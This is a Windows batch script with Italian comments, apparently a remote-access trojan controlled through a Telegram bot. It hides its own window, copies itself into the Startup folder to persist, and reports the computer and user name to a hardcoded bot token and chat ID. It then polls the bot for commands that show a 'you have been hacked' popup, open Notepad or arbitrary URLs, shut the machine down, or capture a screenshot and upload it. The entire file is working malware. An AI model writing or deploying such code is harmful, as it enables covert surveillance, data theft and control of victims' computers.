@echo off
if "%1" == "hidden" goto :start

:: Riavvio in modalità nascosta
powershell -window hidden -command "Start-Process cmd -ArgumentList '/c','%~nx0','hidden' -WindowStyle Hidden"
exit /b

:start
setlocal enabledelayedexpansion

:: Configurazione
set "BOT_TOKEN=7711566157:AAEs2eaKEVqE5pWYLc9L4WiDIc8vS5n83hw"
set "CHAT_ID=5709299213"
set "SCREENSHOT_PATH=%TEMP%\%RANDOM%.png"
set "URL_FILE=%TEMP%\last_url.txt"

:: Invia notifica di connessione
curl -s -X POST "https://api.telegram.org/bot%BOT_TOKEN%/sendMessage" ^
    -d "chat_id=%CHAT_ID%" ^
    -d "text=🟢 Shell aperta su: %COMPUTERNAME% (%USERNAME%)"

:: Aggiungi all'avvio automatico
if not exist "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\remote_controller.bat" (
    copy "%~f0" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\"
)

:: Verifica/installa curl
where curl >nul 2>&1 || (
    bitsadmin /transfer "DownloadCurl" /download /priority high "https://curl.se/windows/latest.cgi?p=win64-mingw.zip" "%TEMP%\curl.zip" || (
        powershell -command "Invoke-WebRequest 'https://curl.se/windows/latest.cgi?p=win64-mingw.zip' -OutFile '%TEMP%\curl.zip'"
    )
    powershell -command "Expand-Archive '%TEMP%\curl.zip' '%TEMP%\curl' -Force"
    set "PATH=%TEMP%\curl\curl-*-win64-mingw\bin;%PATH%"
)

:: Loop principale
:command_loop
:: Controlla nuovi messaggi
curl -s -X GET "https://api.telegram.org/bot%BOT_TOKEN%/getUpdates" > "%TEMP%\updates.json"

:: Estrai comandi dai messaggi
for /f "tokens=1,* delims= " %%A in ('powershell -command "$json=Get-Content '%TEMP%\updates.json'|ConvertFrom-Json;if($json.ok){$json.result|ForEach-Object{if($_.message.text){Write-Output ($_.message.text)}}}"') do (
    set "cmd=%%A"
    set "arg=%%B"
    
    :: Notifica comando ricevuto
    curl -s -X POST "https://api.telegram.org/bot%BOT_TOKEN%/sendMessage" ^
        -d "chat_id=%CHAT_ID%" ^
        -d "text=📡 Comando ricevuto: %%A %%B"
    
    if /i "!cmd!" == "pop" (
        :: Mostra popup
        mshta vbscript:Execute("msgbox ""Sei stato hackerato!"",0,""Avviso di sicurezza"")(window.close)
        curl -s -X POST "https://api.telegram.org/bot%BOT_TOKEN%/sendMessage" ^
            -d "chat_id=%CHAT_ID%" ^
            -d "text=✅ Popup mostrato su %COMPUTERNAME%"
    
    ) else if /i "!cmd!" == "note" (
        :: Apri notepad con testo
        echo !arg! > "%TEMP%\note.txt"
        notepad "%TEMP%\note.txt"
        curl -s -X POST "https://api.telegram.org/bot%BOT_TOKEN%/sendMessage" ^
            -d "chat_id=%CHAT_ID%" ^
            -d "text=📝 Notepad aperto su %COMPUTERNAME% con testo: !arg!"
    
    ) else if /i "!cmd!" == "off" (
        :: Spegni computer
        curl -s -X POST "https://api.telegram.org/bot%BOT_TOKEN%/sendMessage" ^
            -d "chat_id=%CHAT_ID%" ^
            -d "text=🔴 Spegnimento di %COMPUTERNAME% in corso..."
        shutdown /s /t 0
    
    ) else if /i "!cmd!" == "foto" (
        :: Cattura screenshot
        powershell -command "Add-Type -AssemblyName System.Windows.Forms; [Windows.Forms.SendKeys]::SendWait('{PRTSC}'); Start-Sleep -Milliseconds 1000; $img=[Windows.Forms.Clipboard]::GetImage(); if($img){$img.Save('%SCREENSHOT_PATH%',[Drawing.Imaging.ImageFormat]::Png)}"
        
        if exist "%SCREENSHOT_PATH%" (
            curl -s -X POST "https://api.telegram.org/bot%BOT_TOKEN%/sendPhoto" ^
                -F chat_id=%CHAT_ID% ^
                -F photo=@"%SCREENSHOT_PATH%" ^
                -F caption="📸 Screenshot da %COMPUTERNAME%"
            del "%SCREENSHOT_PATH%" >nul
        )
    
    ) else if /i "!cmd!" == "url" (
        :: Apri URL
        if "!arg!" neq "" (
            echo !arg! > "%URL_FILE%"
            start "" "!arg!"
            curl -s -X POST "https://api.telegram.org/bot%BOT_TOKEN%/sendMessage" ^
                -d "chat_id=%CHAT_ID%" ^
                -d "text=🌐 URL aperto su %COMPUTERNAME%: !arg!"
        )
    )
)

:: Attesa prima di controllare nuovi comandi
timeout /t 5 /nobreak >nul
goto command_loop
